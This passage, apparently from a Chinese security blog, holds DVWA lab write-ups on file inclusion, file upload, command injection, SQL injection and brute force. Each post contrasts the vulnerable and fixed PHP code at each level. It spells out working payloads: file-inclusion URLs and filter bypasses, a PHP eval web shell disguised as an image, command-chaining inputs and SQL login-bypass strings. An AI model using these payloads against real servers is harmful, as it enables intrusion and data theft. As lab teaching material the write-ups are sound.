results while( $row = mysqli_fetch_assoc( $result ) ) { // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = &quot;SELECT COUNT(*) FROM users;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); ?&gt; 漏洞利用High核心代码&lt;?php if( isset( $_SESSION [ &#39;id&#39; ] ) ) { // Get input $id = $_SESSION[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 漏洞利用Impossible核心代码 if( isset( $_GET[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) { // Check the database $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data->bindParam( ':id', $id, PDO::PARAM_INT ); $data->execute(); $row = $data->fetch(); // Make sure only 1 result is returned if( $data->rowCount() == 1 ) { // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo "ID: {$id}First name: {$first}Surname: {$last}"; } } } // Generate Anti-CSRF token generateSessionToken(); ?>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之File Inclusion]]></title>
    <url>%2F2019%2F04%2F17%2Fdvwa-zhi-file-inclusion%2F</url>
    <content type="text"><![CDATA[前言File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。 Low核心代码&lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; ?&gt; 可以看到，服务器端对page参数没有做任何的过滤跟检查。 服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 点击file1.php后，显示如下:而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。 漏洞利用本地文件包含构造url：http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/shadow 报错，显示没有这个文件，说明服务器系统不是Linux，但同时暴露了服务器文件的绝对路径 C:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php。 构造url（绝对路径）：http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpStudy\PHPTutorial\WWW\DVWA\php.ini成功读取了服务器的php.ini文件 构造url（相对路径）：。。。。。。待续 远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。 Medium核心代码&lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; // Input validation $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。 漏洞利用使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。例如page=hthttp://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。 同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。 本地文件包含http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini 远程文件包含 http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt High核心代码&lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; // Input validation if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // This isn&#39;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 漏洞利用High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。构造url：http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini Impossible核心代码&lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; // Only allow include.php or file{1..3}.php if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { // This isn&#39;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之File Upload]]></title>
    <url>%2F2019%2F04%2F16%2Fdvwa-zhi-file-upload%2F</url>
    <content type="text"><![CDATA[前言File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。 Low核心代码&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; basename(path,suffix)函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。 可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。 漏洞利用文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。不幸的是，这里三个条件全都满足。上传文件test.php（一句话木马） &lt;?php @eval($_POST[123]); ?&gt; 上传成功，并且返回了上传路径.打开中国菜刀，右键添加，地址栏填入上传文件所在路径:http://192.168.221.136/DVWA/hackable/uploads/test.php参数名（一句话木马口令）为123。然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。可以下载、修改服务器的所有文件。 Medium核心代码 &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } ?&gt; 可以看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。 漏洞利用方法一(文件包含+文件上传)因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为test.png。 上传成功！ 打开中国菜刀不幸的是，虽然成功上传了文件，但是并不能成功获取webshell权限，在菜刀上无论进行什么操作都会返回如下信息。 中国菜刀的原理是向上传文件发送包含123参数的post请求，通过控制123参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。 那么如何让服务器将其解析为php文件呢？我们想到文件包含漏洞. http://192.168.221.136/dvwa/vulnerabilities/fi/?page=hthttp://tp://192.168.221.136/dvwa/hackable/uploads/hack.png 成功获取webshell权限。 方法二(抓包修改文件类型)上传hack.png文件，抓包。 可以看到文件类型为image/png，尝试修改filename为hack.php。 上菜刀，获取webshell权限。 High核心代码&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_tmp = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } ?&gt; strrpos(string,find,start)函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。 getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是*.jpg、*.jpeg、*.png之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。 漏洞利用%00截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片。 所以我们在文件头部加上了jpg格式的 GIF89 GIF89 &lt;?php @eval($_POST[123])?&gt; 或者我们可以在cmd命令行下： copy /b 1.jpg+1.php 1.jpg 把一句话木马写入到图片的最末端也可以。 emmmmm….好像是因为版本的问题，还是上传不了。。。。。。 Impossible核心代码&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_tmp = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;; //$target_file = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; $target_file = md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; $temp_file = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#39;image/jpeg&#39; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; in_get(varname)函数返回相应选项的值 imagecreatefromjpeg ( filename )函数返回图片文件的图像标识，失败返回false imagejpeg ( image , filename , quality)从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。 imagedestroy( img )函数销毁图像资源 可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之Command Injection]]></title>
    <url>%2F2019%2F04%2F14%2Fdvwa-zhi-command-injection%2F</url>
    <content type="text"><![CDATA[前言命令执行漏洞的原理：在操作系统中， &amp; 、&amp;&amp; 、| 、 || 都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令 Low核心代码&lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 可以看到，low级别的代码接收了用户输入的ip，然后根据服务器是否是Windows NT系统，对目标ip进行不同的ping测试。但是这里对用户输入的ip并没有进行任何的过滤，所以我们可以进行命令执行漏洞。 我们ping一下百度的ip地址看看，可以看到能ping通 我们尝试输入 61.135.169.125 &amp; ipconfig ,在操作系统中，” &amp; 、&amp;&amp; 、| 、 || “都可以作为命令连接符使用,我们在ping完后再执行ipconfig 命令查看ip信息 可以看到，成功执行。然后我们就可以继续执行我们的命令了。把ipconfig换成其他的系统命令 Medium核心代码&lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Set blacklist $substitutions = array( &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39; =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 可以看到，medium级别的代码在low级别的代码上增加量了对 &amp;&amp; 和 ；的过滤，但是这并没有什么软用。 我们根本就不用 &amp;&amp; ，我们直接用 &amp; &amp;&amp;和&amp;的区别在于，&amp;&amp;是执行完前面的命令然后执行后面的命令，&amp;是不管前面的命令是否值执行，后面的都执行 可以看到，我们直接按照low级别的命令就可以绕过执行。 由于使用的是str_replace把”&amp;&amp;”、”;”替换为空字符，因此可以采用以下方式绕过： 61.135.169.125&amp;;&amp;ipconfig High核心代码&lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $target = trim($_REQUEST[ &#39;ip&#39; ]); // Set blacklist $substitutions = array( &#39;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39; =&gt; &#39;&#39;, &#39;| &#39; =&gt; &#39;&#39;, &#39;-&#39; =&gt; &#39;&#39;, &#39;$&#39; =&gt; &#39;&#39;, &#39;(&#39; =&gt; &#39;&#39;, &#39;)&#39; =&gt; &#39;&#39;, &#39;`&#39; =&gt; &#39;&#39;, &#39;||&#39; =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 可以看到，High级别的代码进行了黑名单过滤，把一些常见的命令连接符给过滤了。黑名单过滤看似安全，但是如果黑名单不全是话，是很容易进行绕过的。我们仔细看黑名单过滤中的|,|后面还有一个空格，所以我们可以进行绕过，输入下面命令。 61.135.169.125|ipconfig |是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。 Impossible核心代码&lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $target = $_REQUEST[ &#39;ip&#39; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&#39;s put the IP back together. $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; stripslashes(string): 该函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。 explode(separator,string,limit): 该函数把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。 is_numeric(string): 该检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。 可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之Brute Force]]></title>
    <url>%2F2019%2F04%2F13%2Fdvwa-zhi-brute-force%2F</url>
    <content type="text"><![CDATA[前言Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。 Low核心代码&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Get username $user = $_GET[ &#39;username&#39; ]; // Get password $pass = $_GET[ &#39;password&#39; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false可以看到，服务器只是验证了参数Login是否被设置，没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。 漏洞利用方法一：Burpsuite爆破 抓包 Send to Intruder 对password参数进行爆破 选中Payloads，载入字典，点击Start attack进行爆破 可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。 SQL注入 username：admin’ or ‘1’=’1password：(空) username：admin’ #password：(空) Medium核心代码&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制。 具体的mysql_real_escape_string函数绕过问题详见：http://blog.csdn.net/hornedreaper1988/article/details/43520257 http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html 漏洞利用虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样，这里就不赘述了。 High核心代码&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate 